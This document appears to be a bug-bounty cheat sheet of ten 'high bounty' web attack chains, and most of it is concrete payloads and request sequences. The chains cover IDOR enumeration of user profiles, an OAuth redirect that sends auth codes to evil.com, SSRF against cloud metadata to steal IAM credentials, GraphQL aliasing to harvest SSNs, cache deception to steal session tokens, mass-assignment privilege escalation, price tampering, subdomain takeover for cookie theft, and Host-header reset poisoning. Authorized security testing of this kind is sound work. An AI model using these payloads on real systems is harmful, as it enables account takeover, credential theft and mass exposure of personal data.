# High Bounty Patterns — Real-World $10K+ Techniques

## Pattern 1: IDOR Chain (most common $10K+ bug)
**The formula**: Find read IDOR → prove write IDOR → demonstrate mass data access
```
1. GET /api/v1/users/123/profile → 200 (see own data)
2. GET /api/v1/users/124/profile → 200 (see VICTIM data) ← IDOR confirmed
3. PUT /api/v1/users/124/profile → 200 (MODIFY victim data) ← Critical
4. Enumerate /api/v1/users/{1..10000}/profile → mass PII leak
5. Report: "Attacker can read/modify all 50K user profiles"
```
**Why it pays**: Demonstrates real impact on all users, not just theory.

## Pattern 2: OAuth Redirect Chain ($5K-$25K)
```
1. Find open redirect: /redirect?url=https://evil.com → redirects
2. Use as OAuth redirect_uri: /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://evil.com
3. Victim clicks → auth code sent to evil.com
4. Exchange code for token → full account takeover
```
**Key**: The redirect must be on the same domain. Subdomain wildcards count.

## Pattern 3: Race Condition on Financial ($10K-$50K)
```
1. Create promo code endpoint: POST /api/redeem {"code": "PROMO50"}
2. Send 20 parallel requests simultaneously
3. If code redeemed 3+ times → balance inflated
4. Prove: show balance before ($100) and after ($250) with 3 redemptions
```
**Key**: Screenshot the balance change. Financial impact = highest bounties.

## Pattern 4: SSRF → Cloud Metadata → RCE ($15K-$100K)
```
1. Find SSRF: POST /api/import {"url": "http://169.254.169.254/latest/meta-data/"}
2. Extract IAM role: /latest/meta-data/iam/security-credentials/
3. Get temp credentials: AccessKeyId, SecretAccessKey, Token
4. Use credentials to access S3, Lambda, or EC2
5. Report: "Full cloud infrastructure compromise via SSRF"
```

## Pattern 5: GraphQL IDOR via Aliasing ($3K-$15K)
```graphql
{
  a1: user(id: "victim-uuid-1") { email phone ssn }
  a2: user(id: "victim-uuid-2") { email phone ssn }
  a3: user(id: "victim-uuid-3") { email phone ssn }
  # ... up to 100 aliases in single request
}
```
**Key**: Bypasses rate limiting because it's a single HTTP request.

## Pattern 6: Cache Deception → Session Hijack ($10K-$30K)
```
1. Victim visits: /account/settings (contains PII, session token)
2. Attacker tricks victim into: /account/settings/x.css
3. CDN caches this as static CSS file
4. Attacker requests /account/settings/x.css → gets victim's page from cache
5. Extract session token / CSRF token from cached page
```

## Pattern 7: Mass Assignment → Privilege Escalation ($5K-$20K)
```
POST /api/users/register
{"email":"test@evil.com","password":"123","role":"admin"}

# Or via profile update:
PUT /api/users/me
{"name":"test","is_admin":true,"subscription":"enterprise"}
```
**Key**: Try every field from the API response as input. If GET returns `role`, try setting it in PUT.

## Pattern 8: Second-Order SSRF via Webhook ($5K-$15K)
```
1. Register webhook URL: POST /settings/webhooks {"url":"http://169.254.169.254/latest/meta-data/"}
2. Trigger event that fires webhook
3. Webhook response stored in logs/notifications 
4. Read logs: GET /api/webhook-logs → contains metadata response
```

## Pattern 9: Business Logic — Price Manipulation ($3K-$20K)
```
1. Add item to cart: POST /cart {"item_id":1, "quantity":1, "price":9999}
2. Check if price param is trusted (should come from server, not client)
3. POST /cart {"item_id":1, "quantity":1, "price":1}
4. Checkout at $0.01 instead of $99.99
5. Also try: negative quantity, negative price, 0 price, MAX_INT price
```

## Pattern 10: Subdomain Takeover → Phishing/Cookie Steal ($2K-$10K)
```
1. Find dangling CNAME: old.target.com → CNAME → dead-service.herokuapp.com
2. Register dead-service on Heroku/AWS/etc
3. Serve phishing page or XSS payload on old.target.com
4. If parent domain cookies set to .target.com → steal all cookies
```

## Universal Tips from Top Hunters
- **Test the mobile API** (`/api/mobile/v1/`) — often different (weaker) auth than web
- **Test v1 when v2 exists** — old versions often lack security fixes
- **Look for internal API docs** — `/api-docs`, `/swagger.json`, `/_debug/`
- **GraphQL introspection** is almost always unauthenticated
- **File upload + SSRF**: if app accepts URL for file upload → SSRF
- **Password reset poisoning**: `Host: evil.com` in reset request → link goes to evil.com
- **MFA bypass**: Request MFA code → change email → old MFA code still works on new email
